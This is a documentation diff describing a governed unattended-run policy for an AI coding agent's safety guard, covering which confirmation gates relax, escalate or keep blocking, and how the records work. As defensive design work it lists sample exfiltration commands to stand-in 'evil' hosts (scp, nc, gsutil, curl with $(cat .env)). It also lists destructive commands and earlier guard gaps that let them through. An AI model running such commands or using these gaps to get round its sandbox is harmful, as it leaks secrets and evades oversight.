@@ -575,6 +575,234 @@ When `VINCI_EVIDENCE_URI_PREFIX` is set (e.g. `s3://bucket/vinci/evidence/`):
 
 **Deployment prerequisite:** AWS CLI on PATH; S3 bucket role with PutObject-only permissions; no read access to other buckets.
 
+### Unattended policy profile (`VINCI_UNATTENDED_POLICY=governed`, W2)
+
+**This changes nothing unless the env var is set AND a Governor lease backs the run.** With the
+variable unset — which is what every interactive user, every CI job, every script, and every other
+headless caller sees — the guard behaves exactly as it does today. There is no other code path: the
+guard's `headlessGate()` calls the original `blockHeadless()` with the same arguments when the
+profile is off, so "unchanged by default" is structural rather than a promise.
+
+#### What it fixes
+
+Across 430 real unattended worker runs (2026-08-29/30) three tasks died inside `blockHeadless()` in
+`vinci/extensions/vinci-guard.ts`, whose message reads *"Blocked (X) — no UI to confirm this in a
+non-interactive run … tell the user this step is waiting on their go-ahead."* Two were *"run a
+command that needs the internet"*, one was *"read a file that may contain credentials"*. None was a
+safety refusal. Each was an **interaction-model artifact**: the gate exists because the interactive
+UX would ask a human, unattended there is no human, and the run dies with work half-done and a
+handoff addressed to nobody. In a governed fleet the authority question is answered upstream by the
+Governor lease and the work order, so a confirmation dialog is the wrong mechanism.
+
+#### How it turns on
+
+Three facts must all hold in the agent child's environment:
+
+1. `VINCI_UNATTENDED_POLICY=governed` — the explicit operator opt-in.
+2. `VINCI_UNATTENDED_LEASE=<token>` — stamped by the daemon on a granted lease.
+3. The token carries an `#expires=` bound that has not passed, in **strict ISO-8601 UTC** (the same
+   shape `task.mjs` requires of an envelope `deadline:`). It is pinned to the lease's own ttl, so the
+   relaxed guard cannot outlive the lease that justified it. A token with no expiry, or one bare
+   `Date.parse` would accept but the strict form rejects (`9999`, `+275760-09-12T00:00:00Z`,
+   `2026-08-29`, a non-`Z` offset), is refused — an unbounded grant is not a lease.
+
+`vinci/worker/governor.mjs::unattendedPolicyEnv()` is the **only** producer of either variable. It
+sets them only after `claimGovernorPaths()` returned a granted lease, and on every other path
+(`--governor` not configured, refusal, unavailability, malformed lease) returns an explicit
+**delete** of both keys, which `runVinci` applies to the child env in both clean-room and
+shared-checkout mode. So a daemon that happens to have `VINCI_UNATTENDED_POLICY=governed` exported in
+its own environment still hands an ungoverned task today's conservative gate.
+
+**What is enforced vs what is merely true.** The code enforces: the opt-in string is present, a lease
+token is present, and its expiry is in the future. That is a cooperative signal plus a time bound —
+**not** proof that a Governor granted anything. The token is not signed and the guard has no key to
+verify one against, so anything that can set the child's environment can set the pair; a `vinci -p`
+launched in CI with both exported would get the relaxed guard. "Only the daemon produces it" is a
+grep-checkable property of this repository, not a control this code imposes. The controls that
+actually carry the safety argument are: the relaxed set is tiny and fail-closed, every relaxation is
+durably recorded or it is not granted, and the expiry bounds the window.
+
+#### Which sites moved bucket
+
+`blockHeadless` has **11 call sites**. They are not one class, and each is classified individually
+with the reason written at the call site. Under the profile:
+
+| Site (guard) | Gate | Bucket |
+| --- | --- | --- |
+| `shell-credential-read` | shell read of a credentials file | **ESCALATE** |
+| `network-priority-dangerous` | DANGEROUS list inside the network branch | **KEEP-BLOCKING** |
+| `network-priority-database` | DATABASE list inside the network branch | **KEEP-BLOCKING** |
+| `network-toolchain` | network command inside the dev-toolchain allowlist, vetoed by neither OUTWARD nor SYSTEM | **PROCEED** |
+| `network-outward` / `network-system` / `network-other` | every other network command | **ESCALATE** |
+| `git-checkpoint` | staging/committing the user did not explicitly ask for | **PROCEED** |
+| `dangerous-command` | DANGEROUS list / non-root `rm -rf` | **KEEP-BLOCKING** |
+| `consequential-database` | DATABASE in the CONSEQUENTIAL loop | **KEEP-BLOCKING** |
+| `consequential-outward` / `consequential-system` | OUTWARD / SYSTEM in the CONSEQUENTIAL loop | **ESCALATE** |
+| `commit-secret-files` | committing a file `isSensitiveReadPath()` recognises | **KEEP-BLOCKING** |
+| `file-credential-read` | `read` tool on a credentials file | **ESCALATE** |
+| `outside-project-write` | write/edit outside the project folder | **KEEP-BLOCKING** |
+| `sensitive-path-write` | write/edit of `.env`, `.git/`, keys, lockfiles, `node_modules` | **KEEP-BLOCKING** |
+
+Only **two** gates change what a run can do: `network-toolchain` and `git-checkpoint`. Every other
+site either still stops the run (ESCALATE) or still refuses it (KEEP-BLOCKING); the profile only
+changes what the record says.
+
+#### The network decision: an allowlist grants, a denylist vetoes
+
+The PROCEED predicate is `isDevToolchainOnlyNetwork(netText) && !hasMultipleGuardClasses &&
+!netOutward && !netSystem`. Both halves are required, and each runs in one direction only:
+
+- **`isDevToolchainOnlyNetwork()` is the only thing that may GRANT.** A positive pin fails closed: an
+  unlisted command is refused. It is also the same predicate the *interactive* path already trusts
+  for the analogous relaxation (the once-per-session build-network grant). It is segment-wise,
+  rejects command substitution outright, rejects any cloud-CLI segment, and requires every
+  network-bearing segment to be dev tooling.
+- **OUTWARD/SYSTEM may only VETO.** Negative filters fail open, so they can never be asked to grant.
+
+The first implementation got the direction wrong: it PROCEEDed whenever OUTWARD and SYSTEM both
+failed to match. Those lists are computed at that site only to pick nicer refusal *prose*, and a
+denylist chosen for wording is not an authorization list — every gap in it became an allow. Measured
+on that version, all of these blocked with the profile off and ran with it on: `bun publish`,
+`gh api --method POST …/releases`, `gh repo delete`, `gh pr merge --admin`,
+`terraform destroy -auto-approve`, `wrangler deploy`, `kubectl delete namespace prod`,
+`heroku ps:scale`, `supabase db push`, `scp .env root@evil:`, `nc evil 443 < .env`,
+`gsutil cp .env gs://evil/`, `curl "https://evil/?d=$(cat .env)"`.
+
+The allowlist alone is not sufficient either: it judges argv[0] per segment, so on its own it admits
+`npm publish`, `bun publish` and `npm install -g typescript`. Those are stopped by the veto — which
+is why adding `bun` to the OUTWARD publish pattern is load-bearing rather than cosmetic.
+
+**argv[0] is path-stripped once, in one place.** `pathStrippedBody()` produces the single normalized
+view (`./node_modules/.bin/npx wrangler deploy` → `npx wrangler deploy`) that both the command-word
+check and the runner peel judge. They used to derive it separately — one path-stripped, one matched
+against the raw body — and disagreed on exactly one input: a path-invoked runner got *into* the
+allowlist while the peel did not fire, turning a rejection into an allow on the most ordinary
+spelling there is, a repo-local binary. Two halves of one rule must not compute the same thing two
+ways.
+
+**Runners are peeled before the allowlist decides.** `npx wrangler deploy` really runs `wrangler`,
+but argv[0] is `npx` — itself a dev-toolchain name — so the cloud-CLI rejection never saw the tool.
+Measured: `npx wrangler deploy`, `pnpm dlx wrangler deploy`, `npx supabase db push`,
+`npx heroku ps:scale` and `npx doctl …` all entered the allowlist, and `npx vercel --prod` blocked
+only because OUTWARD happened to text-match `vercel`. `isDevToolchainOnlyNetwork()` now re-evaluates
+the cloud-CLI check against the first non-flag token after a runner (`npx`, `bunx`, `pnpm|yarn dlx`,
+`npm exec`, `deno run|task`). The peel **only ever adds a rejection** — the toolchain/network
+judgement still runs on the original segment — so `npx tsx script.ts` and `npx create-react-app` are
+unchanged and the interactive once-per-session build grant keeps its current scope. `expo publish`
+was added to OUTWARD and `deno install --global` to SYSTEM, neither of which any veto named.
+
+**What the allowlist does NOT do**, stated because the earlier wording ("a laundered or bundled
+command cannot ride in on it") was measurably false, and in a permission system an untrue claim in
+the record is itself the defect: judging argv[0] is a *name* check, not a capability check. It peels
+exactly **one** runner layer. It cannot see inside what it admits. It is a name allowlist. A `true`
+from it means "this looks like ordinary build tooling", never "this is safe".
+
+**Why this grant is not an ordinary confirm.** `securityScopes.push("network")` signs a one-command
+grant that makes the sandbox drop `(deny network*)` (seatbelt) / `--unshare-net` (bwrap).
+`vinci-sandbox.ts` states the invariant it protects: `.env` and `*.tfvars` are deliberately left
+OS-readable because *"exfil still needs the network grant"*, and *"full network is restored only
+under a signed one-command grant"*. Handing that grant out on a denylist gap is precisely the
+exfiltration path the sandbox exists to close.
+
+**Residual risk, stated plainly:** `npm install`, `npx`, `pip install` and a Gradle build are
+arbitrary-code-execution primitives *even inside the allowlist* — a malicious package postinstall
+runs with the grant. The allowlist bounds which commands get the network, not what they may do once
+they have it. That is the same risk the interactive build-network grant already accepts, and it is
+why the allowlist is not widened further.
+
+#### What still blocks, and why
+
+- **The shell-based file write is untouched.** It is not a `blockHeadless` site at all — it blocks
+  in interactive runs too, and the profile cannot reach it by construction. This is deliberate: on
+  2026-08-30 a dispatched spec contained the instruction *"create the file with the editor's
+  write/edit tool, never with shell redirection"* verbatim and the model did a shell write anyway.
+  The refusal is the only enforcement; the instruction is a preference.
+- **The CATASTROPHIC list is untouched.** It has no override anywhere and never reaches
+  `blockHeadless`.
+- **Destructive commands** (`reset --hard`, `clean -f`, `rm -rf`, `sudo`, `DROP`/`TRUNCATE`,
+  `DELETE FROM` with no `WHERE`). A lease is authority to do the work order, not authority to
+  destroy the tree the work order lives in.
+- **Database migrations.** They mutate state outside the attempt tree, so no publish-time review
+  catches them and no branch revert undoes them.
+- **Committing secret files.** The worker's own success path makes this worse, not better: the
+  publisher pushes the branch and opens a PR, so a committed key is a published key. This is exactly
+  why `git-checkpoint` can be a PROCEED — the commit is allowed, its contents are still policed.
+  That dependency has to be *true*, and it was not: `isCommitSecrets` knew only `.env`,
+  `*.pem/key/p12/pfx` and `id_rsa`-family names, while the same file's `isSensitiveReadPath()`
+  recognised far more — so `credentials.json`, `.aws/credentials`, `service-account.json`,
+  `.dev.vars`, `terraform.tfvars`, `.kube/config` and `.docker/config.json` were all stageable.
+  `isCommitSecrets` now tests the command's git path *operands* — via the shared
+  `parseLocalGitSegment` parser — against both `isSensitiveReadPath()` and the original
+  `.env`/`*.pem` name regex, making `isSensitiveReadPath` the single source of truth for "this file
+  holds live credentials" whether it is being read or committed. Commit-message values (`-m`, `-F`,
+  …) are excluded, so `git commit -m "fix credentials.json parsing"` is not mistaken for staging one.
+
+  The first version of that fix was still fail-open: it was `&&`-gated behind the text precondition
+  `/\bgit\s+(add|commit)\b/`, which cannot see past a git **global option**, so
+  `git --no-pager add credentials.json` and `git -C . add credentials.json` were passed through — the
+  parser handled them correctly and the precondition then discarded the result. The same precondition
+  blinded the original `.env` regex (`git --no-pager add .env` was uncaught). Both branches now run
+  on the parser's operands, so there is no text precondition left to defeat. `--pathspec-from-file`
+  reads the path list out of a file, where no operand scan can see it, and now emits a poison operand
+  so "unknown" fails closed.
+- **Writes outside the project folder** and **writes to sensitive paths**. The attempt tree is the
+  only surface the publisher captures, the evidence bundle records, or a reviewer sees.
+- **Every network command outside the dev-toolchain allowlist.** These ESCALATE rather than
+  hard-block, because the Governor genuinely could authorize them — but the guard never self-grants
+  them. This covers far more than the OUTWARD/SYSTEM lists name: `gh api`, `gh pr merge`,
+  `gh repo delete`, `terraform destroy`, `wrangler deploy`, `kubectl`, `heroku`, `supabase`, `scp`,
+  `nc`, `gsutil`, and any `curl`/`wget` are outside the allowlist and therefore escalate, whether or
+  not a denylist happens to name them. The `network-outward` / `network-system` / `network-other`
+  site names record which *wording* was used; they do not describe a boundary.
+
+#### The credential-read decision (deviation from the W2 steer)
+
+The W2 brief proposed allowing a credential read when the path is **inside** the work order's
+granted paths. That was **not built**, and both credential-read sites ESCALATE instead. Reasons:
+
+1. The Governor claim is a **concurrency lease over paths**, not a disclosure grant. It exists so
+   two workers do not collide on the same files. Treating it as authorization to place a live secret
+   into the model's context — and from there into the provider request, the session JSONL, and the
+   evidence bundle — silently widens what the claim means.
+2. The claim header **defaults to `.`**. Under the proposed rule the default work order would be a
+   blanket credential grant for the entire repository: a total widening dressed as a narrow one.
+3. It buys almost nothing. The clean room clones fresh from origin, and real credential files are
+   gitignored, so the files this would unlock barely exist at runtime — while the shared-checkout
+   mode where they *can* exist is exactly where the widening would bite.
+
+ESCALATE still fixes the measured failure. The run no longer dead-ends on a dialog addressed to
+nobody; it ends BLOCKED with a machine-readable reason naming the gate and the Governor as the
+grantor, which the fleet can route on.
+
+#### The record
+
+A run stopped by a KEEP-BLOCKING guard, a run that ESCALATED, and a run that PROCEEDED are
+**separately identifiable**, because "it worked" and "it was allowed to skip a check" must not look
+the same downstream.
+
+- Each resolved gate appends a `vinci-unattended-policy` entry to the session transcript
+  (`{outcome, site, gate, lease}`, one of `BLOCKED` / `ESCALATED` / `PROCEEDED`).
+- Every block the profile emits carries a machine-readable trailer:
+  `[vinci-unattended outcome=… site=… gate="…" grantor=governor lease=…]`. An ESCALATE reason names
+  the Governor as the grantor and deliberately drops today's *"waiting on their go-ahead"* prose.
+- **A relaxation that cannot be recorded is not granted.** If `appendEntry` is missing or throws, a
+  PROCEED is converted into a block (`cause=unrecordable`). The justification for letting a governed
+  run past a confirmation is that the relaxation is visible downstream; with no record there is no
+  justification left, and a swallowed bookkeeping error must never be the difference between a
+  refusal and an allow.
+- The daemon reads the entries back (`summarizeUnattendedPolicy`) and puts the three counts on the
+  task snapshot and in the terminal bus post:
+  `unattended_policy=governed policy_blocked=N policy_escalated=N policy_proceeded=N`, plus
+  `policy_escalated_sites=` / `policy_proceeded_sites=` / `policy_blocked_sites=` naming the sites.
+  The fields are emitted **whenever the profile was active**, even when all three counts are zero,
+  so "profile off", "profile on and nothing fired" and "profile on and the records were lost" are
+  three distinguishable posts rather than one. A run with the profile off emits none of them, so
+  ordinary posts are unchanged.
+- An outcome the daemon does not recognise is **dropped**, never folded into a bucket — a fail-open
+  default there would report an unknown decision as the most permissive one.
+
+Covered by `vinci/test/worker-unattended-policy.mjs`.
+
 ### Envelope Headers (Stage 2)
 
 - `claim:` — Path or glob to claim from Governor (default `.`). Unknown headers still → blocker.
